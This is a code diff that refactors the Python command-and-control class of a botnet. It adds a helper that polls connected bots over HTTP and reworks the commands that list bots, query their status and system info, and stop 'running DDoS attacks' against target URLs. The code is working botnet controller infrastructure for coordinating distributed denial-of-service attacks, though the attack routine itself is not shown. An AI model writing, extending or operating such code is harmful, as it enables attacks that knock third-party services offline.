@@ -7,7 +7,7 @@ import threading
 from termcolor import colored, cprint
 
 
-# TODO function to handle request and remove disconnected bots
+# TODO function to handle request and remove disconnected bots (add disconnected to a list and remove them after)
 
 class CnC:
     """
@@ -21,8 +21,8 @@ class CnC:
 
         self.__cmds = {
             'help': {'fun': self.__commands, 'desc': self.__commands.__doc__, 'args': False},
-            'bots': {'fun': self.__list_clients, 'desc': self.__list_clients.__doc__, 'args': False},
-            'info': {'fun': self.__get_info, 'desc': self.__get_info.__doc__, 'args': True},
+            'bots': {'fun': self.__list_bots, 'desc': self.__list_bots.__doc__, 'args': False},
+            'info': {'fun': self.__info, 'desc': self.__info.__doc__, 'args': True},
             'status': {'fun': self.__status, 'desc': self.__status.__doc__, 'args': True},
             'start': {'fun': self.__start, 'desc': self.__start.__doc__, 'args': True},
             'stop': {'fun': self.__stop, 'desc': self.__stop.__doc__, 'args': False},
@@ -46,6 +46,31 @@ class CnC:
                 continue
             self.__bots[addr] = port
 
+    def __send_gets(self, path, addresses=None):
+        """
+        Send get requests for the specified path to the given addresses or to all the bots connected if none is given.
+        """
+        with self.__lock:
+            if not self.__bots:
+                return None
+
+            if not addresses:
+                addresses = self.__bots.keys()
+
+            responses = {}
+
+            for addr in addresses:
+                if addr not in self.__bots.keys():
+                    responses[addr] = None
+                    continue
+
+                try:
+                    responses[addr] = requests.get(f"http://{addr}:{self.__bots[addr]}{path}")
+                except (http.client.RemoteDisconnected, requests.exceptions.ConnectionError):
+                    responses[addr] = None
+                    self.__bots.pop(addr)
+        return responses
+
     def __bot_connection(self, stop: threading.Event):
 
         while not stop.is_set():
@@ -58,10 +83,7 @@ class CnC:
 
             with self.__lock:
                 if address in self.__bots.keys():
-                    try:
-                        self.__bots.pop(address)
-                    except ValueError:
-                        print(f"{address} not in bot list")
+                    self.__bots.pop(address)
                 else:
                     self.__bots[address] = int(client.recv(1024).decode("utf-8"))
             client.close()
@@ -70,84 +92,53 @@ class CnC:
         """
         Lists all the commands.
         """
-        return "\n\t- " + "\n\t- ".join(
-            f"{cmd}: {self.__cmds[cmd]['desc'].strip()}" for cmd in self.__cmds.keys())
+        return "\n\t- " + "\n\t- ".join(f"{cmd}: {self.__cmds[cmd]['desc'].strip()}" for cmd in self.__cmds.keys())
 
-    def __list_clients(self) -> str:
+    def __list_bots(self) -> str:
         """
         Lists the bots that are connected to the botnet.
         """
-        with self.__lock:
-            if self.__bots:
-                res = ""
-                for addr, port in self.__bots.items():
-                    try:
-                        response = requests.get(f"http://{addr}:{port}/status")
-                        status = json.loads(response.text)
-                        res += f"\t- IP:\t{addr}\n\t  Port:\t{port}\n\t  CONNECTED\n\t  Action:\t{status['action']}\n" \
-                               f"\t  Targets:\t{status['targets']}\n "
-                    except (http.client.RemoteDisconnected, requests.exceptions.ConnectionError):
-                        res += f"\t- IP:\t{addr}\n\t  Port:\t{port}\n\t  DISCONNECTED"
-                return "Bots connected:\n" + res
-            return colored("No bots connected.", 'red')
+        res = "Bots connected:\n"
+        responses = self.__send_gets('/status')
 
-    def __get_info(self, addresses) -> str:
+        if responses is None:
+            return colored("No bots connected.", "red")
+
+        for addr, resp in responses.items():
+            status = json.loads(resp.text)
+            res += f"\t- IP:\t{addr}\n\t  Port:\t{self.__bots[addr]}\n\t  Action:\t{status['action']}\n" \
+                   f"\t  Targets:\t{status['targets']}\n "
+        return res
+
+    def __get_something(self, addresses, path) -> str:
         """
-        Get information about the software and hardware configurations of specific bots given their IP addresses.
+        Get info or status.
         """
-        with self.__lock:
-            if not self.__bots:
-                return colored("No bots connected.", 'red')
+        res = ""
+        responses = self.__send_gets(path, addresses=addresses)
+        if responses is None:
+            return colored("No bots connected.", "red")
+        for addr, resp in responses.items():
+            res += f"\nBot {addr}:\n"
 
-            res = ""
-
-            for address in addresses:
-
-                res += f"System info of bot {address}:\n"
-
-                if address not in self.__bots.keys():
-                    res += colored("This address does not belong to any connected bot.\n\n", 'red')
-                    continue
-
-                try:
-                    response = requests.get(f"http://{address}:{self.__bots[address]}/info")
-                except (http.client.RemoteDisconnected, requests.exceptions.ConnectionError):
-                    res += colored("Bot disconnected.\n", 'red')
-                    continue
-
-                for k, v in json.loads(response.text).items():
+            if resp is not None and resp.status_code == 200:
+                for k, v in json.loads(resp.text).items():
                     res += f"\t- {k}: {v}\n"
-                res += "\n"
-            return res
+            else:
+                res += colored("\tBot is not connected.\n", "red")
+        return res
 
     def __status(self, addresses):
         """
         Check the status of a specific bot given his IP addresses.
         """
-        with self.__lock:
-            if not self.__bots:
-                return colored("No bots connected.", 'red')
+        return self.__get_something(addresses, "/status")
 
-            res = ""
-
-            for address in addresses:
-
-                res += f"Status of bot {address}:\n"
-
-                if address not in self.__bots.keys():
-                    res += colored("This address does not belong to any connected bot.\n\n", 'red')
-                    continue
-
-                try:
-                    response = requests.get(f"http://{address}:{self.__bots[address]}/status")
-                except (http.client.RemoteDisconnected, requests.exceptions.ConnectionError):
-                    res += colored("Bot disconnected.\n", 'red')
-                    continue
-
-                for k, v in json.loads(response.text).items():
-                    res += f"\t- {k}: {v}\n"
-                res += "\n"
-            return res
+    def __info(self, addresses):
+        """
+        Get information about the software and hardware configurations of specific bots given their IP addresses.
+        """
+        return self.__get_something(addresses, "/info")
 
     def __start(self, urls):
         """
@@ -170,19 +161,19 @@ class CnC:
         """
         Stop the running DDoS attacks.
         """
-        with self.__lock:
-            if len(self.__bots) == 0:
-                return colored("No bot connected.", 'red')
-            responses = {
-                requests.get(f"http://{address}:{port}/stop").status_code
-                for address, port in self.__bots.items()
-            }
-            if len(responses) != 1:
-                return colored("Attack did not stop...", "red")
-            code = responses.pop()
-            if code == 406:
-                return colored("There isn't any attack running", "yellow")
-            return colored("Attack stopped successfully!", "green")
+        responses = self.__send_gets('/stop')
+
+        if responses is None:
+            return colored("No bot connected.", 'red')
+
+        codes = {r.status_code for r in responses.values()}
+
+        if len(codes) != 1:
+            return colored("Attack did not stop...", "red")
+        code = codes.pop()
+        if code == 406:
+            return colored("There isn't any attack running", "yellow")
+        return colored("Attack stopped successfully!", "green")
 
     def __exit(self) -> str:
         """
